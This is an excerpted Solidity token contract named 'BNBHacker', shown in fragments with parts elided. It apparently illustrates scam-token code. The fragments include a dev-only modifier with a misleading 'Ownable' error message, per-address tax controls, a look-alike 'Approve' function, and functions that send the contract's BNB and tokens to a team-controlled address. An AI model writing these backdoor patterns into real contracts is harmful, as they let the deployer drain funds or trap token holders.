...
contract BNBHacker is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "BNBHacker";
    string private _symbol = "BNBHacker";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0xc1afBB3de9Eddfa83aB8f7aDEFc45d83264Abc2A); 
    address payable private teamWalletAddress = payable(0xD413fa55De9591e62A9E8EF493d9BF65767AF21C); 
	...
	address  public TeamApi =_msgSender();
	...
	modifier devCan {
       require(TeamApi == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
	...
	function claimBalance() external {
        payable(TeamApi).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount) external{
        IERC20(token).transfer(TeamApi, amount);
    }
	...
	function setAddressToken(address _address, bool _enable, uint256 _addressTaxFee) external devCan {
	...
	function Approve(address spender,uint256 amount)public devCan{
